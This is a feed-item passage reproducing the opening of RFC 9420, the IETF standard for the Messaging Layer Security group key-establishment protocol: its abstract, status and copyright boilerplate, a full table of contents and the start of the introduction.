            <description><![CDATA[<p>URL: <a href="https://datatracker.ietf.org/doc/html/rfc9420">https://datatracker.ietf.org/doc/html/rfc9420</a>, See on <a href="https://news.ycombinator.com/item?id=36863915">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<table>
<thead><tr>
<td>RFC 9420</td>
<td>MLS</td>
<td>July 2023</td>
</tr></thead>
<tfoot><tr>
<td>Barnes, et al.</td>
<td>Standards Track</td>
<td>[Page]</td>
</tr></tfoot>
</table>



<h2 id="title">The Messaging Layer Security (MLS) Protocol</h2>
<section id="section-abstract">
      <h2 id="abstract"><a href="#abstract">Abstract</a></h2>
<p id="section-abstract-1">Messaging applications are increasingly making use of end-to-end
security mechanisms to ensure that messages are only accessible to
the communicating endpoints, and not to any servers involved in delivering
messages.  Establishing keys to provide such protections is
challenging for group chat settings, in which more than two
clients need to agree on a key but may not be online at the same
time.  In this document, we specify a key establishment
protocol that provides efficient asynchronous group key establishment
with forward secrecy (FS) and post-compromise security (PCS) for groups
in size ranging from two to thousands.<a href="#section-abstract-1">¬∂</a></p>
</section>
<section id="status-of-memo">
        <h2 id="name-status-of-this-memo">
<a href="#name-status-of-this-memo">Status of This Memo</a>
        </h2>
<p id="section-boilerplate.1-1">
            This is an Internet Standards Track document.<a href="#section-boilerplate.1-1">¬∂</a></p>
<p id="section-boilerplate.1-2">
            This document is a product of the Internet Engineering Task Force
            (IETF).  It represents the consensus of the IETF community.  It has
            received public review and has been approved for publication by
            the Internet Engineering Steering Group (IESG).  Further
            information on Internet Standards is available in Section 2 of 
            RFC 7841.<a href="#section-boilerplate.1-2">¬∂</a></p>
<p id="section-boilerplate.1-3">
            Information about the current status of this document, any
            errata, and how to provide feedback on it may be obtained at
            <span><a href="https://www.rfc-editor.org/info/rfc9420">https://www.rfc-editor.org/info/rfc9420</a></span>.<a href="#section-boilerplate.1-3">¬∂</a></p>
</section>
<section id="copyright">
        <h2 id="name-copyright-notice">
<a href="#name-copyright-notice">Copyright Notice</a>
        </h2>
<p id="section-boilerplate.2-1">
            Copyright (c) 2023 IETF Trust and the persons identified as the
            document authors. All rights reserved.<a href="#section-boilerplate.2-1">¬∂</a></p>
<p id="section-boilerplate.2-2">
            This document is subject to BCP 78 and the IETF Trust's Legal
            Provisions Relating to IETF Documents
            (<span><a href="https://trustee.ietf.org/license-info">https://trustee.ietf.org/license-info</a></span>) in effect on the date of
            publication of this document. Please review these documents
            carefully, as they describe your rights and restrictions with
            respect to this document. Code Components extracted from this
            document must include Revised BSD License text as described in
            Section 4.e of the Trust Legal Provisions and are provided without
            warranty as described in the Revised BSD License.<a href="#section-boilerplate.2-2">¬∂</a></p>
</section>
<section id="toc">
        <a href="#" onclick="scroll(0,0)">‚ñ≤</a><h2 id="name-table-of-contents">
<a href="#name-table-of-contents">Table of Contents</a>
        </h2>
<nav><ul>
<li id="section-toc.1-1.1">
            <p id="section-toc.1-1.1.1"><a href="#section-1">1</a>.&nbsp;&nbsp;<a href="#name-introduction">Introduction</a></p>
</li>
          <li id="section-toc.1-1.2">
            <p id="section-toc.1-1.2.1"><a href="#section-2">2</a>.&nbsp;&nbsp;<a href="#name-terminology">Terminology</a></p>
<ul>
<li id="section-toc.1-1.2.2.1">
                <p id="section-toc.1-1.2.2.1.1"><a href="#section-2.1">2.1</a>.&nbsp;&nbsp;<a href="#name-presentation-language">Presentation Language</a></p>
<ul>
<li id="section-toc.1-1.2.2.1.2.1">
                    <p id="section-toc.1-1.2.2.1.2.1.1"><a href="#section-2.1.1">2.1.1</a>.&nbsp;&nbsp;<a href="#name-optional-value">Optional Value</a></p>
</li>
                  <li id="section-toc.1-1.2.2.1.2.2">
                    <p id="section-toc.1-1.2.2.1.2.2.1"><a href="#section-2.1.2">2.1.2</a>.&nbsp;&nbsp;<a href="#name-variable-size-vector-length">Variable-Size Vector Length Headers</a></p>
</li>
                </ul>
</li>
            </ul>
</li>
          <li id="section-toc.1-1.3">
            <p id="section-toc.1-1.3.1"><a href="#section-3">3</a>.&nbsp;&nbsp;<a href="#name-protocol-overview">Protocol Overview</a></p>
<ul>
<li id="section-toc.1-1.3.2.1">
                <p id="section-toc.1-1.3.2.1.1"><a href="#section-3.1">3.1</a>.&nbsp;&nbsp;<a href="#name-cryptographic-state-and-evo">Cryptographic State and Evolution</a></p>
</li>
              <li id="section-toc.1-1.3.2.2">
                <p id="section-toc.1-1.3.2.2.1"><a href="#section-3.2">3.2</a>.&nbsp;&nbsp;<a href="#name-example-protocol-execution">Example Protocol Execution</a></p>
</li>
              <li id="section-toc.1-1.3.2.3">
                <p id="section-toc.1-1.3.2.3.1"><a href="#section-3.3">3.3</a>.&nbsp;&nbsp;<a href="#name-external-joins">External Joins</a></p>
</li>
              <li id="section-toc.1-1.3.2.4">
                <p id="section-toc.1-1.3.2.4.1"><a href="#section-3.4">3.4</a>.&nbsp;&nbsp;<a href="#name-relationships-between-epoch">Relationships between Epochs</a></p>
</li>
            </ul>
</li>
          <li id="section-toc.1-1.4">
            <p id="section-toc.1-1.4.1"><a href="#section-4">4</a>.&nbsp;&nbsp;<a href="#name-ratchet-tree-concepts">Ratchet Tree Concepts</a></p>
<ul>
<li id="section-toc.1-1.4.2.1">
                <p id="section-toc.1-1.4.2.1.1"><a href="#section-4.1">4.1</a>.&nbsp;&nbsp;<a href="#name-ratchet-tree-terminology">Ratchet Tree Terminology</a></p>
<ul>
<li id="section-toc.1-1.4.2.1.2.1">
                    <p id="section-toc.1-1.4.2.1.2.1.1"><a href="#section-4.1.1">4.1.1</a>.&nbsp;&nbsp;<a href="#name-ratchet-tree-nodes">Ratchet Tree Nodes</a></p>
</li>
                  <li id="section-toc.1-1.4.2.1.2.2">
                    <p id="section-toc.1-1.4.2.1.2.2.1"><a href="#section-4.1.2">4.1.2</a>.&nbsp;&nbsp;<a href="#name-paths-through-a-ratchet-tre">Paths through a Ratchet Tree</a></p>
</li>
                </ul>
</li>
              <li id="section-toc.1-1.4.2.2">
                <p id="section-toc.1-1.4.2.2.1"><a href="#section-4.2">4.2</a>.&nbsp;&nbsp;<a href="#name-views-of-a-ratchet-tree">Views of a Ratchet Tree</a></p>
</li>
            </ul>
</li>
          <li id="section-toc.1-1.5">
            <p id="section-toc.1-1.5.1"><a href="#section-5">5</a>.&nbsp;&nbsp;<a href="#name-cryptographic-objects">Cryptographic Objects</a></p>
<ul>
<li id="section-toc.1-1.5.2.1">
                <p id="section-toc.1-1.5.2.1.1"><a href="#section-5.1">5.1</a>.&nbsp;&nbsp;<a href="#name-cipher-suites">Cipher Suites</a></p>
<ul>
<li id="section-toc.1-1.5.2.1.2.1">
                    <p id="section-toc.1-1.5.2.1.2.1.1"><a href="#section-5.1.1">5.1.1</a>.&nbsp;&nbsp;<a href="#name-public-keys">Public Keys</a></p>
</li>
                  <li id="section-toc.1-1.5.2.1.2.2">
                    <p id="section-toc.1-1.5.2.1.2.2.1"><a href="#section-5.1.2">5.1.2</a>.&nbsp;&nbsp;<a href="#name-signing">Signing</a></p>
</li>
                  <li id="section-toc.1-1.5.2.1.2.3">
                    <p id="section-toc.1-1.5.2.1.2.3.1"><a href="#section-5.1.3">5.1.3</a>.&nbsp;&nbsp;<a href="#name-public-key-encryption">Public Key Encryption</a></p>
</li>
                </ul>
</li>
              <li id="section-toc.1-1.5.2.2">
                <p id="section-toc.1-1.5.2.2.1"><a href="#section-5.2">5.2</a>.&nbsp;&nbsp;<a href="#name-hash-based-identifiers">Hash-Based Identifiers</a></p>
</li>
              <li id="section-toc.1-1.5.2.3">
                <p id="section-toc.1-1.5.2.3.1"><a href="#section-5.3">5.3</a>.&nbsp;&nbsp;<a href="#name-credentials">Credentials</a></p>
<ul>
<li id="section-toc.1-1.5.2.3.2.1">
                    <p id="section-toc.1-1.5.2.3.2.1.1"><a href="#section-5.3.1">5.3.1</a>.&nbsp;&nbsp;<a href="#name-credential-validation">Credential Validation</a></p>
</li>
                  <li id="section-toc.1-1.5.2.3.2.2">
                    <p id="section-toc.1-1.5.2.3.2.2.1"><a href="#section-5.3.2">5.3.2</a>.&nbsp;&nbsp;<a href="#name-credential-expiry-and-revoc">Credential Expiry and Revocation</a></p>
</li>
                  <li id="section-toc.1-1.5.2.3.2.3">
                    <p id="section-toc.1-1.5.2.3.2.3.1"><a href="#section-5.3.3">5.3.3</a>.&nbsp;&nbsp;<a href="#name-uniquely-identifying-client">Uniquely Identifying Clients</a></p>
</li>
                </ul>
</li>
            </ul>
</li>
          <li id="section-toc.1-1.6">
            <p id="section-toc.1-1.6.1"><a href="#section-6">6</a>.&nbsp;&nbsp;<a href="#name-message-framing">Message Framing</a></p>
<ul>
<li id="section-toc.1-1.6.2.1">
                <p id="section-toc.1-1.6.2.1.1"><a href="#section-6.1">6.1</a>.&nbsp;&nbsp;<a href="#name-content-authentication">Content Authentication</a></p>
</li>
              <li id="section-toc.1-1.6.2.2">
                <p id="section-toc.1-1.6.2.2.1"><a href="#section-6.2">6.2</a>.&nbsp;&nbsp;<a href="#name-encoding-and-decoding-a-pub">Encoding and Decoding a Public Message</a></p>
</li>
              <li id="section-toc.1-1.6.2.3">
                <p id="section-toc.1-1.6.2.3.1"><a href="#section-6.3">6.3</a>.&nbsp;&nbsp;<a href="#name-encoding-and-decoding-a-pri">Encoding and Decoding a Private Message</a></p>
<ul>
<li id="section-toc.1-1.6.2.3.2.1">
                    <p id="section-toc.1-1.6.2.3.2.1.1"><a href="#section-6.3.1">6.3.1</a>.&nbsp;&nbsp;<a href="#name-content-encryption">Content Encryption</a></p>
</li>
                  <li id="section-toc.1-1.6.2.3.2.2">
                    <p id="section-toc.1-1.6.2.3.2.2.1"><a href="#section-6.3.2">6.3.2</a>.&nbsp;&nbsp;<a href="#name-sender-data-encryption">Sender Data Encryption</a></p>
</li>
                </ul>
</li>
            </ul>
</li>
          <li id="section-toc.1-1.7">
            <p id="section-toc.1-1.7.1"><a href="#section-7">7</a>.&nbsp;&nbsp;<a href="#name-ratchet-tree-operations">Ratchet Tree Operations</a></p>
<ul>
<li id="section-toc.1-1.7.2.1">
                <p id="section-toc.1-1.7.2.1.1"><a href="#section-7.1">7.1</a>.&nbsp;&nbsp;<a href="#name-parent-node-contents">Parent Node Contents</a></p>
</li>
              <li id="section-toc.1-1.7.2.2">
                <p id="section-toc.1-1.7.2.2.1"><a href="#section-7.2">7.2</a>.&nbsp;&nbsp;<a href="#name-leaf-node-contents">Leaf Node Contents</a></p>
</li>
              <li id="section-toc.1-1.7.2.3">
                <p id="section-toc.1-1.7.2.3.1"><a href="#section-7.3">7.3</a>.&nbsp;&nbsp;<a href="#name-leaf-node-validation">Leaf Node Validation</a></p>
</li>
              <li id="section-toc.1-1.7.2.4">
                <p id="section-toc.1-1.7.2.4.1"><a href="#section-7.4">7.4</a>.&nbsp;&nbsp;<a href="#name-ratchet-tree-evolution">Ratchet Tree Evolution</a></p>
</li>
              <li id="section-toc.1-1.7.2.5">
                <p id="section-toc.1-1.7.2.5.1"><a href="#section-7.5">7.5</a>.&nbsp;&nbsp;<a href="#name-synchronizing-views-of-the-">Synchronizing Views of the Tree</a></p>
</li>
              <li id="section-toc.1-1.7.2.6">
                <p id="section-toc.1-1.7.2.6.1"><a href="#section-7.6">7.6</a>.&nbsp;&nbsp;<a href="#name-update-paths">Update Paths</a></p>
</li>
              <li id="section-toc.1-1.7.2.7">
                <p id="section-toc.1-1.7.2.7.1"><a href="#section-7.7">7.7</a>.&nbsp;&nbsp;<a href="#name-adding-and-removing-leaves">Adding and Removing Leaves</a></p>
</li>
              <li id="section-toc.1-1.7.2.8">
                <p id="section-toc.1-1.7.2.8.1"><a href="#section-7.8">7.8</a>.&nbsp;&nbsp;<a href="#name-tree-hashes">Tree Hashes</a></p>
</li>
              <li id="section-toc.1-1.7.2.9">
                <p id="section-toc.1-1.7.2.9.1"><a href="#section-7.9">7.9</a>.&nbsp;&nbsp;<a href="#name-parent-hashes">Parent Hashes</a></p>
<ul>
<li id="section-toc.1-1.7.2.9.2.1">
                    <p id="section-toc.1-1.7.2.9.2.1.1"><a href="#section-7.9.1">7.9.1</a>.&nbsp;&nbsp;<a href="#name-using-parent-hashes">Using Parent Hashes</a></p>
</li>
                  <li id="section-toc.1-1.7.2.9.2.2">
                    <p id="section-toc.1-1.7.2.9.2.2.1"><a href="#section-7.9.2">7.9.2</a>.&nbsp;&nbsp;<a href="#name-verifying-parent-hashes">Verifying Parent Hashes</a></p>
</li>
                </ul>
</li>
            </ul>
</li>
          <li id="section-toc.1-1.8">
            <p id="section-toc.1-1.8.1"><a href="#section-8">8</a>.&nbsp;&nbsp;<a href="#name-key-schedule">Key Schedule</a></p>
<ul>
<li id="section-toc.1-1.8.2.1">
                <p id="section-toc.1-1.8.2.1.1"><a href="#section-8.1">8.1</a>.&nbsp;&nbsp;<a href="#name-group-context">Group Context</a></p>
</li>
              <li id="section-toc.1-1.8.2.2">
                <p id="section-toc.1-1.8.2.2.1"><a href="#section-8.2">8.2</a>.&nbsp;&nbsp;<a href="#name-transcript-hashes">Transcript Hashes</a></p>
</li>
              <li id="section-toc.1-1.8.2.3">
                <p id="section-toc.1-1.8.2.3.1"><a href="#section-8.3">8.3</a>.&nbsp;&nbsp;<a href="#name-external-initialization">External Initialization</a></p>
</li>
              <li id="section-toc.1-1.8.2.4">
                <p id="section-toc.1-1.8.2.4.1"><a href="#section-8.4">8.4</a>.&nbsp;&nbsp;<a href="#name-pre-shared-keys">Pre-Shared Keys</a></p>
</li>
              <li id="section-toc.1-1.8.2.5">
                <p id="section-toc.1-1.8.2.5.1"><a href="#section-8.5">8.5</a>.&nbsp;&nbsp;<a href="#name-exporters">Exporters</a></p>
</li>
              <li id="section-toc.1-1.8.2.6">
                <p id="section-toc.1-1.8.2.6.1"><a href="#section-8.6">8.6</a>.&nbsp;&nbsp;<a href="#name-resumption-psk">Resumption PSK</a></p>
</li>
              <li id="section-toc.1-1.8.2.7">
                <p id="section-toc.1-1.8.2.7.1"><a href="#section-8.7">8.7</a>.&nbsp;&nbsp;<a href="#name-epoch-authenticators">Epoch Authenticators</a></p>
</li>
            </ul>
</li>
          <li id="section-toc.1-1.9">
            <p id="section-toc.1-1.9.1"><a href="#section-9">9</a>.&nbsp;&nbsp;<a href="#name-secret-tree">Secret Tree</a></p>
<ul>
<li id="section-toc.1-1.9.2.1">
                <p id="section-toc.1-1.9.2.1.1"><a href="#section-9.1">9.1</a>.&nbsp;&nbsp;<a href="#name-encryption-keys">Encryption Keys</a></p>
</li>
              <li id="section-toc.1-1.9.2.2">
                <p id="section-toc.1-1.9.2.2.1"><a href="#section-9.2">9.2</a>.&nbsp;&nbsp;<a href="#name-deletion-schedule">Deletion Schedule</a></p>
</li>
            </ul>
</li>
          <li id="section-toc.1-1.10">
            <p id="section-toc.1-1.10.1"><a href="#section-10">10</a>.&nbsp;<a href="#name-key-packages">Key Packages</a></p>
<ul>
<li id="section-toc.1-1.10.2.1">
                <p id="section-toc.1-1.10.2.1.1"><a href="#section-10.1">10.1</a>.&nbsp;&nbsp;<a href="#name-keypackage-validation">KeyPackage Validation</a></p>
</li>
            </ul>
</li>
          <li id="section-toc.1-1.11">
            <p id="section-toc.1-1.11.1"><a href="#section-11">11</a>.&nbsp;<a href="#name-group-creation">Group Creation</a></p>
<ul>
<li id="section-toc.1-1.11.2.1">
                <p id="section-toc.1-1.11.2.1.1"><a href="#section-11.1">11.1</a>.&nbsp;&nbsp;<a href="#name-required-capabilities">Required Capabilities</a></p>
</li>
              <li id="section-toc.1-1.11.2.2">
                <p id="section-toc.1-1.11.2.2.1"><a href="#section-11.2">11.2</a>.&nbsp;&nbsp;<a href="#name-reinitialization">Reinitialization</a></p>
</li>
              <li id="section-toc.1-1.11.2.3">
                <p id="section-toc.1-1.11.2.3.1"><a href="#section-11.3">11.3</a>.&nbsp;&nbsp;<a href="#name-subgroup-branching">Subgroup Branching</a></p>
</li>
            </ul>
</li>
          <li id="section-toc.1-1.12">
            <p id="section-toc.1-1.12.1"><a href="#section-12">12</a>.&nbsp;<a href="#name-group-evolution">Group Evolution</a></p>
<ul>
<li id="section-toc.1-1.12.2.1">
                <p id="section-toc.1-1.12.2.1.1"><a href="#section-12.1">12.1</a>.&nbsp;&nbsp;<a href="#name-proposals">Proposals</a></p>
<ul>
<li id="section-toc.1-1.12.2.1.2.1">
                    <p id="section-toc.1-1.12.2.1.2.1.1"><a href="#section-12.1.1">12.1.1</a>.&nbsp;&nbsp;<a href="#name-add">Add</a></p>
</li>
                  <li id="section-toc.1-1.12.2.1.2.2">
                    <p id="section-toc.1-1.12.2.1.2.2.1"><a href="#section-12.1.2">12.1.2</a>.&nbsp;&nbsp;<a href="#name-update">Update</a></p>
</li>
                  <li id="section-toc.1-1.12.2.1.2.3">
                    <p id="section-toc.1-1.12.2.1.2.3.1"><a href="#section-12.1.3">12.1.3</a>.&nbsp;&nbsp;<a href="#name-remove">Remove</a></p>
</li>
                  <li id="section-toc.1-1.12.2.1.2.4">
                    <p id="section-toc.1-1.12.2.1.2.4.1"><a href="#section-12.1.4">12.1.4</a>.&nbsp;&nbsp;<a href="#name-presharedkey">PreSharedKey</a></p>
</li>
                  <li id="section-toc.1-1.12.2.1.2.5">
                    <p id="section-toc.1-1.12.2.1.2.5.1"><a href="#section-12.1.5">12.1.5</a>.&nbsp;&nbsp;<a href="#name-reinit">ReInit</a></p>
</li>
                  <li id="section-toc.1-1.12.2.1.2.6">
                    <p id="section-toc.1-1.12.2.1.2.6.1"><a href="#section-12.1.6">12.1.6</a>.&nbsp;&nbsp;<a href="#name-externalinit">ExternalInit</a></p>
</li>
                  <li id="section-toc.1-1.12.2.1.2.7">
                    <p id="section-toc.1-1.12.2.1.2.7.1"><a href="#section-12.1.7">12.1.7</a>.&nbsp;&nbsp;<a href="#name-groupcontextextensions">GroupContextExtensions</a></p>
</li>
                  <li id="section-toc.1-1.12.2.1.2.8">
                    <p id="section-toc.1-1.12.2.1.2.8.1"><a href="#section-12.1.8">12.1.8</a>.&nbsp;&nbsp;<a href="#name-external-proposals">External Proposals</a></p>
</li>
                </ul>
</li>
              <li id="section-toc.1-1.12.2.2">
                <p id="section-toc.1-1.12.2.2.1"><a href="#section-12.2">12.2</a>.&nbsp;&nbsp;<a href="#name-proposal-list-validation">Proposal List Validation</a></p>
</li>
              <li id="section-toc.1-1.12.2.3">
                <p id="section-toc.1-1.12.2.3.1"><a href="#section-12.3">12.3</a>.&nbsp;&nbsp;<a href="#name-applying-a-proposal-list">Applying a Proposal List</a></p>
</li>
              <li id="section-toc.1-1.12.2.4">
                <p id="section-toc.1-1.12.2.4.1"><a href="#section-12.4">12.4</a>.&nbsp;&nbsp;<a href="#name-commit">Commit</a></p>
<ul>
<li id="section-toc.1-1.12.2.4.2.1">
                    <p id="section-toc.1-1.12.2.4.2.1.1"><a href="#section-12.4.1">12.4.1</a>.&nbsp;&nbsp;<a href="#name-creating-a-commit">Creating a Commit</a></p>
</li>
                  <li id="section-toc.1-1.12.2.4.2.2">
                    <p id="section-toc.1-1.12.2.4.2.2.1"><a href="#section-12.4.2">12.4.2</a>.&nbsp;&nbsp;<a href="#name-processing-a-commit">Processing a Commit</a></p>
</li>
                  <li id="section-toc.1-1.12.2.4.2.3">
                    <p id="section-toc.1-1.12.2.4.2.3.1"><a href="#section-12.4.3">12.4.3</a>.&nbsp;&nbsp;<a href="#name-adding-members-to-the-group">Adding Members to the Group</a></p>
</li>
                </ul>
</li>
            </ul>
</li>
          <li id="section-toc.1-1.13">
            <p id="section-toc.1-1.13.1"><a href="#section-13">13</a>.&nbsp;<a href="#name-extensibility">Extensibility</a></p>
<ul>
<li id="section-toc.1-1.13.2.1">
                <p id="section-toc.1-1.13.2.1.1"><a href="#section-13.1">13.1</a>.&nbsp;&nbsp;<a href="#name-additional-cipher-suites">Additional Cipher Suites</a></p>
</li>
              <li id="section-toc.1-1.13.2.2">
                <p id="section-toc.1-1.13.2.2.1"><a href="#section-13.2">13.2</a>.&nbsp;&nbsp;<a href="#name-proposals-2">Proposals</a></p>
</li>
              <li id="section-toc.1-1.13.2.3">
                <p id="section-toc.1-1.13.2.3.1"><a href="#section-13.3">13.3</a>.&nbsp;&nbsp;<a href="#name-credential-extensibility">Credential Extensibility</a></p>
</li>
              <li id="section-toc.1-1.13.2.4">
                <p id="section-toc.1-1.13.2.4.1"><a href="#section-13.4">13.4</a>.&nbsp;&nbsp;<a href="#name-extensions">Extensions</a></p>
</li>
              <li id="section-toc.1-1.13.2.5">
                <p id="section-toc.1-1.13.2.5.1"><a href="#section-13.5">13.5</a>.&nbsp;&nbsp;<a href="#name-grease">GREASE</a></p>
</li>
            </ul>
</li>
          <li id="section-toc.1-1.14">
            <p id="section-toc.1-1.14.1"><a href="#section-14">14</a>.&nbsp;<a href="#name-sequencing-of-state-changes">Sequencing of State Changes</a></p>
</li>
          <li id="section-toc.1-1.15">
            <p id="section-toc.1-1.15.1"><a href="#section-15">15</a>.&nbsp;<a href="#name-application-messages">Application Messages</a></p>
<ul>
<li id="section-toc.1-1.15.2.1">
                <p id="section-toc.1-1.15.2.1.1"><a href="#section-15.1">15.1</a>.&nbsp;&nbsp;<a href="#name-padding">Padding</a></p>
</li>
              <li id="section-toc.1-1.15.2.2">
                <p id="section-toc.1-1.15.2.2.1"><a href="#section-15.2">15.2</a>.&nbsp;&nbsp;<a href="#name-restrictions">Restrictions</a></p>
</li>
              <li id="section-toc.1-1.15.2.3">
                <p id="section-toc.1-1.15.2.3.1"><a href="#section-15.3">15.3</a>.&nbsp;&nbsp;<a href="#name-delayed-and-reordered-appli">Delayed and Reordered Application Messages</a></p>
</li>
            </ul>
</li>
          <li id="section-toc.1-1.16">
            <p id="section-toc.1-1.16.1"><a href="#section-16">16</a>.&nbsp;<a href="#name-security-considerations">Security Considerations</a></p>
<ul>
<li id="section-toc.1-1.16.2.1">
                <p id="section-toc.1-1.16.2.1.1"><a href="#section-16.1">16.1</a>.&nbsp;&nbsp;<a href="#name-transport-security">Transport Security</a></p>
</li>
              <li id="section-toc.1-1.16.2.2">
                <p id="section-toc.1-1.16.2.2.1"><a href="#section-16.2">16.2</a>.&nbsp;&nbsp;<a href="#name-confidentiality-of-group-se">Confidentiality of Group Secrets</a></p>
</li>
              <li id="section-toc.1-1.16.2.3">
                <p id="section-toc.1-1.16.2.3.1"><a href="#section-16.3">16.3</a>.&nbsp;&nbsp;<a href="#name-confidentiality-of-sender-d">Confidentiality of Sender Data</a></p>
</li>
              <li id="section-toc.1-1.16.2.4">
                <p id="section-toc.1-1.16.2.4.1"><a href="#section-16.4">16.4</a>.&nbsp;&nbsp;<a href="#name-confidentiality-of-group-me">Confidentiality of Group Metadata</a></p>
<ul>
<li id="section-toc.1-1.16.2.4.2.1">
                    <p id="section-toc.1-1.16.2.4.2.1.1"><a href="#section-16.4.1">16.4.1</a>.&nbsp;&nbsp;<a href="#name-groupid-epoch-and-message-f">GroupID, Epoch, and Message Frequency</a></p>
</li>
                  <li id="section-toc.1-1.16.2.4.2.2">
                    <p id="section-toc.1-1.16.2.4.2.2.1"><a href="#section-16.4.2">16.4.2</a>.&nbsp;&nbsp;<a href="#name-group-extensions">Group Extensions</a></p>
</li>
                  <li id="section-toc.1-1.16.2.4.2.3">
                    <p id="section-toc.1-1.16.2.4.2.3.1"><a href="#section-16.4.3">16.4.3</a>.&nbsp;&nbsp;<a href="#name-group-membership">Group Membership</a></p>
</li>
                </ul>
</li>
              <li id="section-toc.1-1.16.2.5">
                <p id="section-toc.1-1.16.2.5.1"><a href="#section-16.5">16.5</a>.&nbsp;&nbsp;<a href="#name-authentication">Authentication</a></p>
</li>
              <li id="section-toc.1-1.16.2.6">
                <p id="section-toc.1-1.16.2.6.1"><a href="#section-16.6">16.6</a>.&nbsp;&nbsp;<a href="#name-forward-secrecy-and-post-co">Forward Secrecy and Post-Compromise Security</a></p>
</li>
              <li id="section-toc.1-1.16.2.7">
                <p id="section-toc.1-1.16.2.7.1"><a href="#section-16.7">16.7</a>.&nbsp;&nbsp;<a href="#name-uniqueness-of-ratchet-tree-">Uniqueness of Ratchet Tree Key Pairs</a></p>
</li>
              <li id="section-toc.1-1.16.2.8">
                <p id="section-toc.1-1.16.2.8.1"><a href="#section-16.8">16.8</a>.&nbsp;&nbsp;<a href="#name-keypackage-reuse">KeyPackage Reuse</a></p>
</li>
              <li id="section-toc.1-1.16.2.9">
                <p id="section-toc.1-1.16.2.9.1"><a href="#section-16.9">16.9</a>.&nbsp;&nbsp;<a href="#name-delivery-service-compromise">Delivery Service Compromise</a></p>
</li>
              <li id="section-toc.1-1.16.2.10">
                <p id="section-toc.1-1.16.2.10.1"><a href="#section-16.10">16.10</a>.&nbsp;<a href="#name-authentication-service-comp">Authentication Service Compromise</a></p>
</li>
              <li id="section-toc.1-1.16.2.11">
                <p id="section-toc.1-1.16.2.11.1"><a href="#section-16.11">16.11</a>.&nbsp;<a href="#name-additional-policy-enforceme">Additional Policy Enforcement</a></p>
</li>
              <li id="section-toc.1-1.16.2.12">
                <p id="section-toc.1-1.16.2.12.1"><a href="#section-16.12">16.12</a>.&nbsp;<a href="#name-group-fragmentation-by-mali">Group Fragmentation by Malicious Insiders</a></p>
</li>
            </ul>
</li>
          <li id="section-toc.1-1.17">
            <p id="section-toc.1-1.17.1"><a href="#section-17">17</a>.&nbsp;<a href="#name-iana-considerations">IANA Considerations</a></p>
<ul>
<li id="section-toc.1-1.17.2.1">
                <p id="section-toc.1-1.17.2.1.1"><a href="#section-17.1">17.1</a>.&nbsp;&nbsp;<a href="#name-mls-cipher-suites">MLS Cipher Suites</a></p>
</li>
              <li id="section-toc.1-1.17.2.2">
                <p id="section-toc.1-1.17.2.2.1"><a href="#section-17.2">17.2</a>.&nbsp;&nbsp;<a href="#name-mls-wire-formats">MLS Wire Formats</a></p>
</li>
              <li id="section-toc.1-1.17.2.3">
                <p id="section-toc.1-1.17.2.3.1"><a href="#section-17.3">17.3</a>.&nbsp;&nbsp;<a href="#name-mls-extension-types">MLS Extension Types</a></p>
</li>
              <li id="section-toc.1-1.17.2.4">
                <p id="section-toc.1-1.17.2.4.1"><a href="#section-17.4">17.4</a>.&nbsp;&nbsp;<a href="#name-mls-proposal-types">MLS Proposal Types</a></p>
</li>
              <li id="section-toc.1-1.17.2.5">
                <p id="section-toc.1-1.17.2.5.1"><a href="#section-17.5">17.5</a>.&nbsp;&nbsp;<a href="#name-mls-credential-types">MLS Credential Types</a></p>
</li>
              <li id="section-toc.1-1.17.2.6">
                <p id="section-toc.1-1.17.2.6.1"><a href="#section-17.6">17.6</a>.&nbsp;&nbsp;<a href="#name-mls-signature-labels">MLS Signature Labels</a></p>
</li>
              <li id="section-toc.1-1.17.2.7">
                <p id="section-toc.1-1.17.2.7.1"><a href="#section-17.7">17.7</a>.&nbsp;&nbsp;<a href="#name-mls-public-key-encryption-l">MLS Public Key Encryption Labels</a></p>
</li>
              <li id="section-toc.1-1.17.2.8">
                <p id="section-toc.1-1.17.2.8.1"><a href="#section-17.8">17.8</a>.&nbsp;&nbsp;<a href="#name-mls-exporter-labels">MLS Exporter Labels</a></p>
</li>
              <li id="section-toc.1-1.17.2.9">
                <p id="section-toc.1-1.17.2.9.1"><a href="#section-17.9">17.9</a>.&nbsp;&nbsp;<a href="#name-mls-designated-expert-pool">MLS Designated Expert Pool</a></p>
</li>
              <li id="section-toc.1-1.17.2.10">
                <p id="section-toc.1-1.17.2.10.1"><a href="#section-17.10">17.10</a>.&nbsp;<a href="#name-the-message-mls-media-type">The "message/mls" Media Type</a></p>
</li>
            </ul>
</li>
          <li id="section-toc.1-1.18">
            <p id="section-toc.1-1.18.1"><a href="#section-18">18</a>.&nbsp;<a href="#name-references">References</a></p>
<ul>
<li id="section-toc.1-1.18.2.1">
                <p id="section-toc.1-1.18.2.1.1"><a href="#section-18.1">18.1</a>.&nbsp;&nbsp;<a href="#name-normative-references">Normative References</a></p>
</li>
              <li id="section-toc.1-1.18.2.2">
                <p id="section-toc.1-1.18.2.2.1"><a href="#section-18.2">18.2</a>.&nbsp;&nbsp;<a href="#name-informative-references">Informative References</a></p>
</li>
            </ul>
</li>
          <li id="section-toc.1-1.19">
            <p id="section-toc.1-1.19.1"><a href="#appendix-A">Appendix A</a>.&nbsp;&nbsp;<a href="#name-protocol-origins-of-example">Protocol Origins of Example Trees</a></p>
</li>
          <li id="section-toc.1-1.20">
            <p id="section-toc.1-1.20.1"><a href="#appendix-B">Appendix B</a>.&nbsp;&nbsp;<a href="#name-evolution-of-parent-hashes">Evolution of Parent Hashes</a></p>
</li>
          <li id="section-toc.1-1.21">
            <p id="section-toc.1-1.21.1"><a href="#appendix-C">Appendix C</a>.&nbsp;&nbsp;<a href="#name-array-based-trees">Array-Based Trees</a></p>
</li>
          <li id="section-toc.1-1.22">
            <p id="section-toc.1-1.22.1"><a href="#appendix-D">Appendix D</a>.&nbsp;&nbsp;<a href="#name-link-based-trees">Link-Based Trees</a></p>
</li>
          <li id="section-toc.1-1.23">
            <p id="section-toc.1-1.23.1"><a href="#appendix-E"></a><a href="#name-contributors">Contributors</a></p>
</li>
          <li id="section-toc.1-1.24">
            <p id="section-toc.1-1.24.1"><a href="#appendix-F"></a><a href="#name-authors-addresses">Authors' Addresses</a></p>
</li>
        </ul>
</nav>
</section>
<section id="introduction">
      <h2 id="name-introduction">
<a href="#section-1">1. </a><a href="#name-introduction">Introduction</a>
      </h2>
<p id="section-1-1">A group of users who want to send each other encrypted messages needs
a way to derive shared symmetric encryption keys. For two parties,
this problem has been studied thoroughly, with the Double Ratchet
emerging as a common solution <span>[<a href="#DoubleRatchet">DoubleRatchet</a>]</span> <span>[<a href="#Signal">Signal</a>]</span>.
